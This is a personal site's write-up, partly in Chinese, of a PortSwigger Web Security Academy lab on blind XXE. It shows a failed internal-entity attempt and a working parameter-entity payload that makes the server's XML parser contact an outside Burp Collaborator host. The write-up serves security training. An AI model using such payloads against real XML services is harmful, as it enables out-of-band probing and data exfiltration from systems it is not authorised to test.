<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Lab: Blind XXE with out-of-band interaction via XML parameter entities
  #


  tags: Portswigger Web Security Academy Web
  #


Description: This lab has a &ldquo;Check stock&rdquo; feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator&rsquo;s default public server.


  Background
  #

這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在DOCTYPE中直接Reference，也就是利用%這個字元達到這個效果"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Lab: Blind XXE with out-of-band interaction via XML parameter entities"><meta property="og:description" content="Lab: Blind XXE with out-of-band interaction via XML parameter entities # tags: Portswigger Web Security Academy Web # Description: This lab has a “Check stock” feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities. Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server. Background # 這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在DOCTYPE中直接Reference，也就是利用%這個字元達到這個效果"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Portswigger Web Security Academy"><meta property="article:tag" content="Web"><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Lab: Blind XXE with out-of-band interaction via XML parameter entities</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#recon>Recon</a></li><li><a href=#exp>Exp</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities>Lab: Blind XXE with out-of-band interaction via XML parameter entities
<a class=anchor href=#lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities>#</a></h1><h6 id=tags-portswigger-web-security-academy-web>tags: <code>Portswigger Web Security Academy</code> <code>Web</code>
<a class=anchor href=#tags-portswigger-web-security-academy-web>#</a></h6><ul><li>Description: This lab has a &ldquo;Check stock&rdquo; feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.</li><li>Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.</li><li>Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator&rsquo;s default public server.</li></ul><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在<code>DOCTYPE</code>中直接Reference，也就是利用<code>%</code>這個字元達到這個效果</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ul><li>Create a new entity and reference it
:::spoiler Payload<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE test [ &lt;!ENTITY xxe &#34;test&#34;&gt;</span> ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;stockCheck&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;productId&gt;</span>
</span></span><span style=display:flex><span>        &amp;xxe;
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/productId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;storeId&gt;</span>
</span></span><span style=display:flex><span>        1
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/storeId&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/stockCheck&gt;</span>
</span></span></code></pre></div>:::
<img src=https://hackmd.io/_uploads/H1hEjtUNh.png alt>
Seems not work properly&mldr;</li></ul><h2 id=exp>Exp
<a class=anchor href=#exp>#</a></h2><ul><li>Use Parameter Entity
:::spoiler Payload<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &#34;http://a1cby8s3b3bvzxlb8cfaw4jvqmwfk4.burpcollaborator.net&#34;&gt;</span> %xxe; ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;stockCheck&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;productId&gt;</span>
</span></span><span style=display:flex><span>        1
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/productId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;storeId&gt;</span>
</span></span><span style=display:flex><span>        1
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/storeId&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/stockCheck&gt;</span>
</span></span></code></pre></div>:::</li></ul><p>:::spoiler Success Screenshot
<img src=https://hackmd.io/_uploads/rJh0sYLEn.png alt></p><hr><p><img src=https://hackmd.io/_uploads/rk7H2FL42.png alt>
:::</p><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://youtu.be/xjcSMFKVTW4>XXE Lab Breakdown: Blind XXE with out-of-band interaction via XML parameter entities</a>
<a href=https://www.cnblogs.com/Zeker62/p/15190054.html>Lab: Blind XXE with out-of-band interaction via XML parameter entities</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#recon>Recon</a></li><li><a href=#exp>Exp</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>